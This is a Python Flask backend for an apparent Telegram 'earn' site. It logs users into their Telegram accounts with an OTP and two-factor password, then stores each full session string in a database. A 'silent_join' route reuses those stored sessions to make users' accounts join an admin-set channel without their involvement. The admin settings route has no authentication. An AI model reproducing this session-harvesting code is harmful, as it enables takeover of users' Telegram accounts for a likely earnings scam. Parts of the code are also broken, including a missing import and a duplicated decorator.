import os
import asyncio
import threading
from datetime import datetime, timedelta

from flask import Flask, request, jsonify, session, render_template, session, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from functools import wraps

# =========================
# CONFIG
# =========================
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change_this_now")

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=False,  # True করো HTTPS হলে
    PERMANENT_SESSION_LIFETIME=timedelta(days=1)
)

CORS(app)

API_ID = int(os.environ.get("API_ID", "123456"))
API_HASH = os.environ.get("API_HASH", "your_api_hash")
MONGO_URI = os.environ.get("MONGO_URI", "your_mongo_uri")

# ================= DB =================
client_db = MongoClient("YOUR_MONGO_URI")
db = client_db['aaf_tele_earn_db']
users_col = db['users']
settings_col = db['settings']
tasks_col = db['tasks']


# ================= LOGIN REQUIRED =================
def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if "uid" not in session:
            return redirect("/login")
        return f(*args, **kwargs)
    return wrapper


# ================= ADMIN SETTINGS =================
def get_admin():
    return settings_col.find_one({"type": "global"}) or {}

# =========================
# HELPER: SAFE ASYNC RUN
# =========================
def run_async(coro):
    loop = asyncio.new_event_loop()
    try:
        asyncio.set_event_loop(loop)
        return loop.run_until_complete(coro)
    finally:
        loop.close()


# =========================
# SEND OTP
# =========================
@app.route('/api/send_otp', methods=['POST'])
def send_otp():
    data = request.json
    phone = data.get('phone')

    if not phone:
        return jsonify({"success": False, "message": "Phone required"})

    # Rate limit (60 sec)
    user = users_col.find_one({"phone": phone})
    if user and user.get("last_otp_time"):
        if datetime.now() - user["last_otp_time"] < timedelta(seconds=60):
            return jsonify({"success": False, "message": "Try again later"})

    async def main():
        client = None
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await asyncio.wait_for(client.connect(), timeout=10)

            if await client.is_user_authorized():
                return True, "Already logged in"

            result = await client.send_code_request(phone)

            users_col.update_one(
                {"phone": phone},
                {"$set": {
                    "temp_session": client.session.save(),
                    "phone_code_hash": result.phone_code_hash,
                    "auth_pending": True,
                    "last_otp_time": datetime.now()
                }},
                upsert=True
            )

            return True, "OTP Sent"

        except Exception as e:
            print("OTP ERROR:", e)
            return False, "Failed to send OTP"

        finally:
            if client:
                await client.disconnect()

    success, message = run_async(main())
    return jsonify({"success": success, "message": message})


# =========================
# VERIFY LOGIN
# =========================
@app.route('/api/verify_login', methods=['POST'])
def verify_login():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password')

    if not phone:
        return jsonify({"success": False, "message": "Phone required"})

    if not code and not password:
        return jsonify({"success": False, "message": "Code or Password required"})

    temp = users_col.find_one({"phone": phone})
    if not temp or not temp.get("temp_session"):
        return jsonify({"success": False, "message": "Session expired"})

    async def main():
        client = None
        try:
            client = TelegramClient(
                StringSession(temp["temp_session"]),
                API_ID,
                API_HASH
            )
            await asyncio.wait_for(client.connect(), timeout=10)

            if password:
                user = await client.sign_in(password=password.strip())
            else:
                if not temp.get("phone_code_hash"):
                    return False, "Retry OTP"

                user = await client.sign_in(
                    phone=phone,
                    code=code,
                    phone_code_hash=temp["phone_code_hash"]
                )

            final_session = client.session.save()

            users_col.update_one(
                {"phone": phone},
                {"$set": {
                    "telegram_id": user.id,
                    "name": f"{user.first_name or ''} {user.last_name or ''}".strip(),
                    "username": user.username,
                    "session_str": final_session,
                    "auth_pending": False,
                    "last_login": datetime.now()
                }}
            )

            return True, user.id

        except SessionPasswordNeededError:
            return False, "NEED_PASSWORD"

        except Exception as e:
            print("LOGIN ERROR:", e)
            return False, "Login failed"

        finally:
            if client:
                await client.disconnect()

    success, result = run_async(main())

    if success:
        session['uid'] = result
        return jsonify({"success": True})

    if result == "NEED_PASSWORD":
        return jsonify({"success": False, "message": "SHOW_PWD_STEP"})

    return jsonify({"success": False, "message": result})

# =========================
# Users DATA 
# =========================


@app.route('/api/user/data/<int:user_id>')
def user_data(user_id):
    user = users_col.find_one({"telegram_id": user_id})
    admin = get_admin()

    if not user:
        return jsonify({"status": "error"})

    return jsonify({
        "status": "success",
        "user": {
            "username": user.get("name", "User"),
            "telegram_id": user.get("telegram_id"),
            "cash": user.get("main_balance", 0),
            "aaf": user.get("aaf_balance", 0),
            "is_joined": user.get("is_joined", False),
            "refer_count": user.get("refer_count", 0)
        },
        "admin": {
            "server_income": admin.get("server_income", 0),
            "server_trading": admin.get("server_trading", 0),
            "total_users": admin.get("extra_users", 0),
            "channel_url": admin.get("channel_link", "")
        }
    })


# =========================
# SILENT JOIN (BACKGROUND)
# =========================
@app.route('/api/silent_join', methods=['POST'])
@login_required
def silent_join():
    uid = session['uid']
    user = users_col.find_one({"telegram_id": uid})
    admin = get_admin()

    if not user or "session_str" not in user:
        return jsonify({"success": False, "message": "session_expired"})

    async def join():
        client = TelegramClient(
            StringSession(user["session_str"]),
            API_ID,
            API_HASH
        )

        await client.connect()
        await client(JoinChannelRequest(admin.get("channel_id")))
        await client.disconnect()

        users_col.update_one(
            {"telegram_id": uid},
            {"$set": {"is_joined": True}}
        )

        return True

    try:
        asyncio.run(join())
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})


    
# =========================
# BASIC USER DATA
# =========================
@app.route('/api/user')
def get_user():
    uid = session.get('uid')
    if not uid:
        return jsonify({"success": False})

    user = users_col.find_one({"telegram_id": uid})
    if not user:
        return jsonify({"success": False})

    return jsonify({
        "success": True,
        "user": {
            "id": user.get("telegram_id"),
            "name": user.get("name"),
            "username": user.get("username")
        }
    })


# =========================
# LOGIN REQUIRED DECORATOR
# =========================
def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if 'uid' not in session:
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return wrapper

# =========================
# admin DECORATOR
# =========================

@app.route('/admin/update', methods=['POST'])
def admin_update():
    data = request.json
    settings_col.update_one(
        {"type": "global"},
        {"$set": data},
        upsert=True
    )
    return jsonify({"success": True})

# =========================
# DASHBOARD
# =========================
@app.route('/dashboard')
@login_required
def render_dashboard_page():
    try:
        user = users_col.find_one({"telegram_id": int(session['uid'])})
        admin = settings_col.find_one({"type": "global"}) or {}

        return render_template(
            'dashboard.html',
            user=user,
            admin=admin
        )
    except Exception as e:
        print("Dashboard Error:", e)
        return redirect(url_for('logout'))


# =========================
# TASK PAGE
# =========================
@app.route('/task')
@login_required
def render_task_page():
    return render_template('task.html')


# =========================
# TRADING PAGE
# =========================
@app.route('/trading')
@login_required
def render_trading_page():
    return render_template('trading.html')


# =========================
# WALLET
# =========================
@app.route('/wallet')
@login_required
def render_wallet_page():
    return render_template('wallet.html')


# =========================
# ACCOUNT
# =========================
@app.route('/account')
@login_required
def render_account_page():
    return render_template('account.html')


# =========================
# REFER LIST
# =========================
@app.route('/refer_list')
@login_required
def render_refer_page():
    return render_template('refer_list.html')


# =========================
# PAYMENT HISTORY
# =========================
@app.route('/payment_history')
@login_required
def render_history_page():
    return render_template('payment_history.html')


# =========================
# LOGOUT
# =========================
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

# =========================
# RUN SERVER
# =========================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, threaded=True)
